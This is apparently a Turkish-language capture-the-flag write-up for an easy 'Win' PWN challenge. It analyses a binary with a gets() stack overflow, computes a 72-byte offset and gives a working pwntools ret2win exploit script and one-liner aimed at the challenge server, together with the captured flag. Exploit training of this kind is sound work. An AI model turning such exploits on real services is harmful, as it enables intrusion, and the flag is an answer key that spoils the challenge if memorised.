# 🔐 Win - PWN Challenge

<p align="center">
  <img src="https://img.shields.io/badge/PWN-Challenge-darkblue?style=for-the-badge" alt="PWN">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Buffer Overflow-purple?style=for-the-badge&logo=binary" alt="Buffer Overflow">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** PWN  
**Seviye:** Kolay  
**Puan:** 300

**Challenge Dosyası:** [📥 Google Drive - challbirseyleryaz](https://drive.google.com/file/d/1NSspeKtr41BDOCuloTvRS5eNaHpOjRjE/view?usp=drivesdk)

**Server:** `nc 64.226.74.243 9995`


---

## 🔍 Analiz

**Hedef:** Buffer overflow ile `win()` fonksiyonunu çağırıp flag'i almak

**Strateji:** Binary analiz → Buffer overflow → Return address overwrite → win() çağrısı

**İpuçları:**
- 🔴 **gets()** kullanılıyor → Buffer overflow açığı!
- 🎯 **win()** fonksiyonu var ama hiç çağrılmıyor
- ✅ **Not stripped:** Debug sembolleri var
- 📝 `/flag.txt` dosyasını okuyor

---

## ✅ Çözüm Adımları

### 📥 **1. Dosyayı İndirme ve İlk Analiz**

**Binary'i indirip dosya tipini kontrol ediyoruz:**

```bash
file challbirseyleryaz
```

**Çıktı:**
```
challbirseyleryaz: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=687336cac8d8111d67d609a224cfd87cadbaeb0a, 
for GNU/Linux 3.2.0, not stripped
```

**Analiz:**
- 🐧 **ELF 64-bit:** Linux executable
- 🔗 **Dynamically linked:** Harici kütüphaneler kullanıyor
- ✅ **Not stripped:** Debug sembolleri var → Kolay analiz!

---

### 🔤 **2. String Analizi**

**Binary içindeki string'leri inceliyoruz:**

```bash
strings challbirseyleryaz
```

**Önemli string'ler:**
```
/flag.txt
Flag dosyasi bulunamadi!
Bir seyler yaz:
```

> 💡 Program flag.txt dosyasını okuyor ve kullanıcıdan input istiyor!

---

### 🔍 **3. Fonksiyon Analizi**

**Binary'deki fonksiyonları listeliyoruz:**

```bash
nm challbirseyleryaz
```

**Önemli fonksiyonlar:**
```
00000000004011f6 T win
0000000000401278 T vuln
00000000004012a7 T main
                 U gets@GLIBC_2.2.5
```

**Analiz:**
- ✅ **win()** → Flag'i okuyacak fonksiyon (`0x4011f6`)
- ⚠️ **vuln()** → Zafiyet içeren fonksiyon
- 🔴 **gets()** → Tehlikeli! Sınırsız input alıyor

---

### 📊 **4. Disassembly ile Detaylı İnceleme**

**vuln() fonksiyonunu disassemble ediyoruz:**

```bash
objdump -d challbirseyleryaz -M intel | grep -A 30 "<vuln>"
```

**vuln() fonksiyonu:**
```assembly
0000000000401278 <vuln>:
  401278:  f3 0f 1e fa             endbr64
  40127c:  55                      push   rbp
  40127d:  48 89 e5                mov    rbp,rsp
  401280:  48 83 ec 40             sub    rsp,0x40      ; Buffer = 64 byte (0x40)
  401284:  48 8d 05 9e 0d 00 00    lea    rax,[rip+0xd9e]
  40128b:  48 89 c7                mov    rdi,rax
  40128e:  e8 0d fe ff ff          call   4010a0 <puts@plt>
  401293:  48 8d 45 c0             lea    rax,[rbp-0x40] ; Buffer adresi
  401297:  48 89 c7                mov    rdi,rax
  40129a:  b8 00 00 00 00          mov    eax,0x0
  40129f:  e8 2c fe ff ff          call   4010d0 <gets@plt>  ; ← ZAFIYET!
  4012a4:  90                      nop
  4012a5:  c9                      leave
  4012a6:  c3                      ret
```

**Kritik bulgular:**
- 📏 **Buffer boyutu:** 64 byte (`sub rsp,0x40`)
- 📍 **Buffer konumu:** `rbp-0x40` (rbp'den 64 byte aşağıda)
- 🔴 **gets() çağrısı:** Sınırsız input → Buffer overflow!

---

### 🎯 **5. win() Fonksiyonu İnceleme**

**win() fonksiyonunu disassemble ediyoruz:**

```bash
objdump -d challbirseyleryaz -M intel | grep -A 30 "<win>"
```

**win() fonksiyonu:**
```assembly
00000000004011f6 <win>:
  4011f6:  f3 0f 1e fa             endbr64
  4011fa:  55                      push   rbp
  4011fb:  48 89 e5                mov    rbp,rsp
  4011fe:  48 81 ec 90 00 00 00    sub    rsp,0x90
  401205:  48 8d 05 f8 0d 00 00    lea    rax,[rip+0xdf8]    ; "/flag.txt"
  40120c:  48 89 c6                mov    rsi,rax
  40120f:  48 8d 05 f0 0d 00 00    lea    rax,[rip+0xdf0]    ; "r"
  401216:  48 89 c7                mov    rdi,rax
  401219:  e8 d2 fe ff ff          call   4010f0 <fopen@plt> ; fopen("/flag.txt", "r")
  ...
  401255:  e8 66 fe ff ff          call   4010c0 <fgets@plt> ; Flag'i oku
  ...
  401264:  e8 37 fe ff ff          call   4010a0 <puts@plt>  ; Flag'i yazdır
```

**Analiz:**
- 📂 `/flag.txt` dosyasını açıyor
- 📖 Flag'i okuyor (`fgets`)
- 📺 Flag'i ekrana yazdırıyor (`puts`)
- 🎯 **Hedef:** Bu fonksiyonu çağırmak!

---

### 🧮 **6. Offset Hesaplama**

**Stack yapısı:**
```
[Buffer: 64 byte]  ← rbp-0x40'tan başlıyor
[Saved RBP: 8 byte]
[Return Address: 8 byte] ← Buraya win() adresini yazacağız!
```

**Offset hesabı:**
- Buffer: 64 byte
- Saved RBP: 8 byte
- **Toplam offset: 72 byte**

> 💡 72 byte padding + win() adresi = Exploit payload!

---

### 🚀 **7. Exploit Yazma**

**Python ile pwntools kullanarak exploit yazıyoruz:**

```python
from pwn import *

# Remote sunucuya bağlan
p = remote('64.226.74.243', 9995)

# win() fonksiyonunun adresi
win_addr = 0x4011f6

# Payload oluştur
# 72 byte padding + win adresi (little endian)
payload = b'A' * 72 + p64(win_addr)

# "Bir seyler yaz:" mesajını bekle
p.recvuntil(b'Bir seyler yaz:\n')

# Payload'ı gönder
p.sendline(payload)

# Flag'i al ve ekrana yazdır
p.interactive()
```

**Tek satır exploit:**

```bash
python3 -c "from pwn import *; p = remote('64.226.74.243', 9995); p.recvuntil(b'Bir seyler yaz:\n'); p.sendline(b'A' * 72 + p64(0x4011f6)); p.interactive()"
```

---

### 🎉 **8. Flag Alma**

**Exploit'i çalıştırıyoruz:**

```bash
python3 exploit.py
```

**Çıktı:**
```
[+] Opening connection to 64.226.74.243 on port 9995: Done
[*] Switching to interactive mode
Flag{VayCanınaDostumHicCagirmadigimMetoduNasilCalistirdin?}
[*] Got EOF while reading in interactive
```

> 🚩 **FLAG ALINDI!**

---

## 🚩 **FLAG**

```
Flag{VayCanınaDostumHicCagirmadigimMetoduNasilCalistirdin?}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🔍<br><b>file</b><br><sub>Dosya tipi analizi</sub></td>
<td align="center">🔤<br><b>strings</b><br><sub>String extraction</sub></td>
<td align="center">📋<br><b>nm</b><br><sub>Fonksiyon listesi</sub></td>
<td align="center">🔨<br><b>objdump</b><br><sub>Disassembly</sub></td>
</tr>
<tr>
<td align="center">🐍<br><b>Python</b><br><sub>Exploit yazma</sub></td>
<td align="center">⚡<br><b>pwntools</b><br><sub>PWN framework</sub></td>
<td align="center">🌐<br><b>netcat</b><br><sub>Network bağlantı</sub></td>
<td align="center">💻<br><b>Linux</b><br><sub>Terminal ortamı</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# Binary analizi
file challbirseyleryaz
strings challbirseyleryaz
nm challbirseyleryaz

# Disassembly
objdump -d challbirseyleryaz -M intel | grep -A 30 "<vuln>"
objdump -d challbirseyleryaz -M intel | grep -A 30 "<win>"

# Exploit
python3 -c "from pwn import *; p = remote('64.226.74.243', 9995); p.recvuntil(b'Bir seyler yaz:\n'); p.sendline(b'A' * 72 + p64(0x4011f6)); p.interactive()"
```

---

## 💭 **Çözüm Akışı**

```
🔐 "Win" PWN Challenge
            ↓
📥 challbirseyleryaz binary indirildi
            ↓
🔍 file → ELF 64-bit, not stripped
            ↓
📋 nm → win(), vuln(), gets() bulundu
            ↓
🔨 objdump → vuln() disassembly
   → Buffer: 64 byte
   → gets() kullanılıyor (ZAFIYET!)
            ↓
🎯 win() adresi: 0x4011f6
            ↓
🧮 Offset hesabı
   → Buffer: 64 byte
   → Saved RBP: 8 byte
   → Toplam: 72 byte
            ↓
💣 Payload: 'A'*72 + p64(0x4011f6)
            ↓
🚀 Exploit çalıştırıldı
            ↓
📺 win() fonksiyonu çağrıldı
            ↓
🚩 Flag{VayCanınaDostumHicCagirmadigimMetoduNasilCalistirdin?}
```
